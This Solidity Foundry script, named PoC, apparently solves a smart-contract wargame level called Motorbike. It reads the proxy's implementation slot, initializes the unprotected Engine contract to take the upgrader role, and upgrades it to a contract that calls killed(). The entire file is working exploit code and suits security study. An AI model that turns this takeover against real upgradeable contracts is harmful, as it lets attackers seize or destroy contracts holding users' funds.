// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";

interface IMotorbike {
    function upgradeToAndCall(address, bytes memory) external;

    function initialize() external;
}

interface IEngine {
    function upgrader() external view returns (address);

    function initialize() external;

    function upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) external payable;
}

contract PoC is Script {
    IMotorbike level25 = IMotorbike(0x4B777D17a8B2B8510dD37a433A977C2fD5FC93b6);
    IEngine engineAddress =
        IEngine(
            address(
                uint160(
                    uint256(
                        vm.load(
                            address(level25),
                            0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
                        )
                    )
                )
            )
        );

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployer);

        engineAddress.initialize();
        console2.log("Upgrader is :", engineAddress.upgrader());
        bytes memory encodedData = abi.encodeWithSignature("killed()");
        engineAddress.upgradeToAndCall(
            0x19d094D6389c30F7341644Ca6473830c4F416Dd3,
            encodedData
        );

        vm.stopBroadcast();
    }
}
